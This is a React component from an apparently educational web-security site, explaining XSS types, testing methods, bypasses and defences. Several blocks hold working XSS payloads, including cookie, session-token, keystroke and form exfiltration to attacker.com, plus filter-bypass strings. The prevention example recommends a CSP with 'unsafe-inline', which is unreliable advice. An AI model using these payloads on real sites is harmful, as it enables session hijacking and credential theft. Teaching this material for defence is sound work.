
import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const XSS: React.FC = () => {
  return (
    <section id="xss" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Scripting (XSS)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping,
            allowing attackers to execute scripts in the victim's browser. This can lead to session hijacking, credential theft,
            malicious redirects, and website defacement. XSS is consistently ranked among the top web application vulnerabilities.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Execute arbitrary JavaScript in victims' browsers to steal cookies/session tokens, 
              redirect to phishing sites, modify page content, or perform actions impersonating the user.
            </AlertDescription>
          </Alert>
        </div>
        
        {/* Types of XSS */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of XSS Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            <SecurityCard title="Reflected XSS" description="Non-persistent attack where malicious script is reflected off a web server, typically through URLs, search results, or error messages. The attacker tricks victims into clicking malicious links." severity="medium" />
            <SecurityCard title="Stored XSS" description="Malicious script is permanently stored on the target server (e.g., in a database, comment field, forum post) and later retrieved by victims during normal browsing. Most dangerous form of XSS." severity="high" />
            <SecurityCard title="DOM-based XSS" description="Vulnerability exists in client-side code rather than server-side code. JavaScript modifies the DOM in an unsafe way based on attacker-controllable data sources like URL fragments or localStorage." severity="medium" />
          </div>
        </div>

        {/* Detailed XSS Type Analysis */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Detailed XSS Type Analysis & Testing</h4>
          <Tabs defaultValue="reflected">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reflected">Reflected XSS</TabsTrigger>
              <TabsTrigger value="stored">Stored XSS</TabsTrigger>
              <TabsTrigger value="dom">DOM-based XSS</TabsTrigger>
              <TabsTrigger value="blind">Blind XSS</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reflected" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Reflected XSS - Non-Persistent</h5>
                  <p className="text-sm mb-3">
                    The malicious script is "reflected" off a web server, such as in an error message, search result, 
                    or any other response that includes some or all of the input sent to the server as part of the request.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>URL parameters (GET parameters)</li>
                    <li>Form fields that reflect input back to the user</li>
                    <li>Search boxes and their result pages</li>
                    <li>Error messages that include user input</li>
                    <li>HTTP headers that get reflected (User-Agent, Referer, etc.)</li>
                    <li>Hidden form fields that might be processed</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all input points that reflect data back to the response</li>
                    <li>Test with simple payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                    <li>Check if input appears in HTML source and how it's encoded</li>
                    <li>Test different contexts (HTML body, attributes, JavaScript blocks)</li>
                    <li>Try various encoding bypass techniques</li>
                    <li>Test with different browsers for consistency</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Common Entry Points:</h6>
                  <CodeExample
                    language="bash"
                    title="Reflected XSS Entry Points"
                    code={`# URL parameter reflection:
http://target.com/search?q=<script>alert('XSS')</script>

# Error message reflection:
http://target.com/login?error=<img src=x onerror=alert(1)>

# Header reflection:
User-Agent: <script>alert('XSS')</script>`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="stored" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Stored XSS - Persistent</h5>
                  <p className="text-sm mb-3">
                    The malicious script is permanently stored on the target servers, such as in a database, 
                    in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious 
                    script from the server when it requests the stored information.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>User profile information (bio, description, name fields)</li>
                    <li>Comment sections and forum posts</li>
                    <li>File upload functionality (especially filename handling)</li>
                    <li>Contact forms and feedback systems</li>
                    <li>Blog posts and article content</li>
                    <li>Configuration settings and preferences</li>
                    <li>Chat messages and messaging systems</li>
                    <li>Review and rating systems</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all input fields that store data permanently</li>
                    <li>Submit XSS payloads through forms, uploads, and APIs</li>
                    <li>Navigate to pages where the stored data is displayed</li>
                    <li>Check if payload executes when viewing content</li>
                    <li>Test with different user accounts to see impact scope</li>
                    <li>Test administrative interfaces for elevated impact</li>
                    <li>Verify payload persistence across sessions and time</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">High-Impact Targets:</h6>
                  <CodeExample
                    language="html"
                    title="Stored XSS Injection Points"
                    code={`<!-- Admin panel injection -->
Profile bio: <script>stealAdminCookies()</script>

<!-- Public comment injection -->
Comment: <img src=x onerror="window.location='http://evil.com?cookie='+document.cookie">

<!-- File upload name injection -->
Filename: image"><script>alert('Stored XSS')</script>.jpg`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="dom" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">DOM-based XSS</h5>
                  <p className="text-sm mb-3">
                    The vulnerability exists in client-side code rather than server-side code. The attack payload 
                    is executed as a result of modifying the DOM environment in the victim's browser used by the 
                    original client-side script, so that the client-side code runs in an "unexpected" manner.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>URL fragments (#hash) that are processed by JavaScript</li>
                    <li>JavaScript that reads from document.location</li>
                    <li>LocalStorage and SessionStorage data processing</li>
                    <li>PostMessage handlers and cross-frame communication</li>
                    <li>JSON parsing of untrusted data</li>
                    <li>Client-side routing parameters</li>
                    <li>WebSocket message handling</li>
                    <li>Browser history manipulation</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify JavaScript code that processes user-controllable data</li>
                    <li>Analyze sources (where data comes from) and sinks (where data is used)</li>
                    <li>Test URL fragments with XSS payloads</li>
                    <li>Use browser developer tools to trace data flow</li>
                    <li>Test different browsers as DOM APIs may vary</li>
                    <li>Check for unsafe DOM manipulation functions</li>
                    <li>Test client-side template rendering</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Common Sources and Sinks:</h6>
                  <CodeExample
                    language="javascript"
                    title="DOM XSS Sources and Sinks"
                    code={`// Common Sources:
document.location.hash
document.location.search
localStorage.getItem()
window.name

// Dangerous Sinks:
element.innerHTML
document.write()
eval()
setTimeout() with string

// Example payload:
http://target.com/page#<img src=x onerror=alert(1)>`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="blind" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Blind XSS</h5>
                  <p className="text-sm mb-3">
                    A type of stored XSS where the attacker cannot see the payload execution immediately. 
                    The payload executes in a different context, often in administrative panels, log viewers, 
                    or other areas not directly accessible to the attacker.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Contact forms and support ticket systems</li>
                    <li>User-Agent and HTTP headers logged by applications</li>
                    <li>Log file viewers and administrative dashboards</li>
                    <li>Error reporting and monitoring systems</li>
                    <li>Analytics and tracking systems</li>
                    <li>Email templates that include user data</li>
                    <li>PDF generation systems</li>
                    <li>Internal reporting tools</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Set up callback server to receive notifications</li>
                    <li>Inject payloads that make HTTP requests to your server</li>
                    <li>Submit payloads through all possible input vectors</li>
                    <li>Wait for callbacks to confirm execution</li>
                    <li>Test with different payload types and contexts</li>
                    <li>Use tools like XSS Hunter for automated callback handling</li>
                    <li>Monitor for extended periods as execution may be delayed</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Blind XSS Payloads:</h6>
                  <CodeExample
                    language="html"
                    title="Blind XSS Payloads"
                    code={`<!-- Basic callback payload -->
<script>new Image().src='http://attacker.com/xss?cookie='+document.cookie</script>

<!-- Advanced information gathering -->
<script>
fetch('http://attacker.com/data', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    dom: document.documentElement.innerHTML
  })
})
</script>

<!-- SVG-based payload (for filtering bypass) -->
<svg onload="fetch('http://attacker.com/xss?data='+btoa(document.cookie))"></svg>`}
                  />
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Comprehensive Testing Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive XSS Testing Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Reconnaissance</TabsTrigger>
              <TabsTrigger value="injection">Injection Testing</TabsTrigger>
              <TabsTrigger value="context">Context Analysis</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Reconnaissance and Mapping</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Map Input Vectors:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify all user input points (forms, URL parameters, headers)</li>
                      <li>Map file upload functionality and handling</li>
                      <li>Identify AJAX endpoints and API calls</li>
                      <li>Look for hidden form fields and parameters</li>
                      <li>Check for client-side data sources (localStorage, URL fragments)</li>
                    </ul>
                  </li>
                  <li><strong>Analyze Application Flow:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Map data flow from input to output</li>
                      <li>Identify areas where user data is reflected</li>
                      <li>Check for data persistence mechanisms</li>
                      <li>Analyze client-side JavaScript processing</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="injection" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Injection Testing</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Basic XSS Payloads:</h6>
                  <CodeExample
                    language="html"
                    title="Basic XSS Test Payloads"
                    code={`<!-- Simple alert payload -->
<script>alert('XSS')</script>

<!-- Image-based payload -->
<img src=x onerror=alert('XSS')>

<!-- SVG payload -->
<svg onload=alert('XSS')>

<!-- JavaScript protocol -->
javascript:alert('XSS')

<!-- Event handler payload -->
<input type="text" onfocus="alert('XSS')" autofocus>

<!-- Encoded payload -->
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="context" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Context Analysis</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <p className="text-sm mb-3">Understanding the context where your input appears is crucial for crafting effective XSS payloads.</p>
                  
                  <h6 className="font-medium mb-2">Different Contexts Require Different Payloads:</h6>
                  <CodeExample
                    language="html"
                    title="Context-Specific XSS Payloads"
                    code={`<!-- HTML Body Context -->
<div>USER_INPUT</div>
Payload: <script>alert('XSS')</script>

<!-- HTML Attribute Context -->
<input type="text" value="USER_INPUT">
Payload: "><script>alert('XSS')</script>

<!-- JavaScript Context -->
<script>var data = "USER_INPUT";</script>
Payload: ";alert('XSS');//

<!-- CSS Context -->
<style>body { background-image: url('USER_INPUT'); }</style>
Payload: javascript:alert('XSS')

<!-- URL Context -->
<a href="USER_INPUT">Click me</a>
Payload: javascript:alert('XSS')`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced XSS Exploitation Techniques:</h6>
                  <CodeExample
                    language="javascript"
                    title="Advanced XSS Exploitation"
                    code={`// Cookie stealing
document.location='http://attacker.com/steal?cookie='+document.cookie

// Session hijacking
fetch('http://attacker.com/session', {
  method: 'POST',
  body: JSON.stringify({
    sessionId: document.cookie,
    csrf: document.querySelector('[name="csrf-token"]').content
  })
})

// Keylogger
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/keys?key='+e.key)
})

// Form hijacking
document.querySelector('form').addEventListener('submit', function(e) {
  fetch('http://attacker.com/form', {
    method: 'POST',
    body: new FormData(e.target)
  })
})

// Webcam access (requires user permission)
navigator.mediaDevices.getUserMedia({video: true})
  .then(stream => {
    // Send stream to attacker server
  })`}
                  />
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Filter Bypass Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XSS Filter Bypass Techniques</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <p className="text-sm mb-3">
              Modern applications often implement XSS filters. Here are common bypass techniques:
            </p>
            
            <CodeExample
              language="html"
              title="Filter Bypass Techniques"
              code={`<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Using different tags -->
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

<!-- Encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

<!-- Using eval -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

<!-- Template literals -->
<script>\`alert\${''}\`</script>

<!-- Unicode bypass -->
<script>\\u0061lert('XSS')</script>

<!-- Double encoding -->
%253Cscript%253Ealert%28%27XSS%27%29%253C%252Fscript%253E

<!-- Using comments -->
<script>/**/alert('XSS')</script>

<!-- Null byte injection -->
<script>alert('XSS')%00</script>`}
            />
          </div>
        </div>

        {/* XSS Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XSS Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Scanners</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>OWASP ZAP:</strong> Free security scanner with XSS detection</li>
                <li><strong>Burp Suite:</strong> Professional web security testing platform</li>
                <li><strong>Nuclei:</strong> Fast vulnerability scanner with XSS templates</li>
                <li><strong>XSS Hunter:</strong> Platform for finding blind XSS</li>
                <li><strong>DOMPurify:</strong> Library for testing DOM-based XSS</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Browser DevTools:</strong> Built-in debugging and DOM inspection</li>
                <li><strong>XSS Polyglot:</strong> Single payload that works in multiple contexts</li>
                <li><strong>BeEF:</strong> Browser Exploitation Framework</li>
                <li><strong>XSSer:</strong> Automatic XSS detector and exploiter</li>
                <li><strong>Dalfox:</strong> Fast XSS scanner and parameter analysis</li>
              </ul>
            </div>
          </div>
        </div>

        {/* XSS Prevention */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XSS Prevention and Mitigation</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Frontend Frameworks</h5>
            <p className="text-sm mb-3">
              Modern frameworks like React, Vue, and Angular provide built-in XSS protection by automatically escaping content, 
              but can be bypassed when using unsafe methods like dangerouslySetInnerHTML (React), v-html (Vue), or 
              bypassSecurityTrustHtml (Angular). Always avoid these methods unless absolutely necessary and sanitize input first.
            </p>
          </div>
          
          <CodeExample
            language="javascript"
            title="XSS Prevention Best Practices"
            code={`// Input validation and sanitization
function sanitizeInput(input) {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// Content Security Policy (CSP)
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

// HTTPOnly cookies
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// Using DOMPurify for safe HTML
const clean = DOMPurify.sanitize(dirty);
document.getElementById('content').innerHTML = clean;`}
          />
        </div>
      </div>
    </section>
  );
};

export default XSS;
